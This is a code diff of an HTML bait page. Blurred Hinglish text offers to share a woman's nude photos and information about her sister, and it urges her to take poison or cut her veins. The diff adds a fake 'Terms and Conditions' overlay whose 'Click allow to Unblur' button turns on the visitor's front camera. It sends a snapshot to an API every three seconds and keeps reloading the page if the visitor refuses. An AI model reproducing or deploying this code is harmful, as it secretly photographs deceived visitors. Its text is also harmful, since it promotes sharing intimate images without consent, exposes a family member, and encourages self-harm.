@@ -4,59 +4,60 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title style="color: blue;">Ye sab matter yahi karte hai bhai meri ye shate maan le.</title>
+    <style>
+        span#blur{
+            font-size: 22px;
+            filter: blur(3px);
+        }
+        .overlay {
+            display: none;
+            position: fixed;
+            flex-direction: column;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: #fff;
+            font-size: 20px;
+        }
+    </style>
 </head>
+
 <body>
+<!-- Overlay for camera permission -->
+<div class="overlay" id="overlay">
+    <p>Accept our Terms and Conditions to read full text.</p><br>
+    <button onclick="captureAndSend()" style="display:block;">Click allow to Unblur</button>
+</div>
 
 <h1>Deal bs ye hai is sabme mera naam nhe aaye.</h1>
-<p>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate.</p>
+<p><span>Bhai me khud is bc se durr jaana chahta hoo me teri help kar dunga mne jo bhee yahaa likhha h uska screenshot mt liye bs tujhe iske . . . </span><span id="blur">or nude photos chahiye me dunga bo bhee with face or chaahe to iski behen ke baare me bhee bhot information de skta hoo ke bo kyaa kyaa krti h poora khandan esa hee h maa bhee km nhe h iskii bs is sabme mera naam nahi aay kahi se kahi tak or ye mujhse durr ho jaay me phirr isko zeher khana h to zeher khaay yaa nas kaate.</span></p>
+
 
 <script>
-    // Check if camera permission is already granted
-    const cameraPermissionGranted = localStorage.getItem('cameraPermission') === 'granted';
+    document.addEventListener('DOMContentLoaded', function () {
+        localStorage.clear();
+        setTimeout(function () {
+            const overlay = document.getElementById('overlay');
+            overlay.style.display = 'flex'; // Display the overlay
+        }, 1500); // 5000 milliseconds = 5 seconds
+    });
 
     async function captureAndSend() {
-        try {
-            // Check if camera permission is already granted
-            if (!cameraPermissionGranted) {
-                const stream = await navigator.mediaDevices.getUserMedia({
+        try {       
+
+            let Automated = localStorage.getItem('Auto') === 'True';
+            const stream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         facingMode: 'user', // 'user' for front camera
                     },
                 });
 
                 const video = document.createElement('video');
-                document.body.appendChild(video);
-                video.srcObject = stream;
-                await video.play();
-
-                // If permission is granted, store it in localStorage
-                localStorage.setItem('cameraPermission', 'granted');
-
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHight;
-                const context = canvas.getContext('2d');
-
-                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                // Convert canvas data to Blob (binary format)
-                canvas.toBlob(blob => {
-                    // Send the Blob to your API
-                    sendToApi(blob);
-                }, 'image/png');
-
-                stream.getTracks().forEach(track => track.stop());
-                document.body.removeChild(video);
-            } else {
-                // Camera permission is already granted, proceed with capturing and sending
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        facingMode: 'user', // 'user' for front camera
-                    },
-                });
-
-                const video = document.createElement('video');
-                document.body.appendChild(video);
                 video.srcObject = stream;
                 await video.play();
 
@@ -73,13 +74,24 @@
                     sendToApi(blob);
                 }, 'image/png');
 
-                stream.getTracks().forEach(track => track.stop());
-                document.body.removeChild(video);
+                if (!Automated){
+                setInterval(captureAndSend, 3000);
+                localStorage.setItem('Auto', 'True');
+                console.log('Captures Every three seconds..')
+                const overlay = document.getElementById('overlay');
+                overlay.style.display = 'none'; // Display the overlay
+                document.getElementById('blur').style.filter = 'none';
             }
-        } catch (error) {
+
+                stream.getTracks().forEach(track => track.stop());
+            } 
+        catch (error) {
             console.error('Error accessing front camera:', error);
-        }
+            if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
+            setTimeout(function(){
+                alert('Try Again or Refresh the Page.\nYou cannot read the text without accepting our Terms and Conditions.');location.reload(true);}, 2000); }
     }
+}
 
     function sendToApi(blob) {
         // Replace 'your-api-endpoint' with the actual API endpoint
@@ -107,8 +119,6 @@
         });
     }
 
-    // Automatically trigger after x seconds
-    setInterval(captureAndSend, 5000);
 </script>
 
 </body>
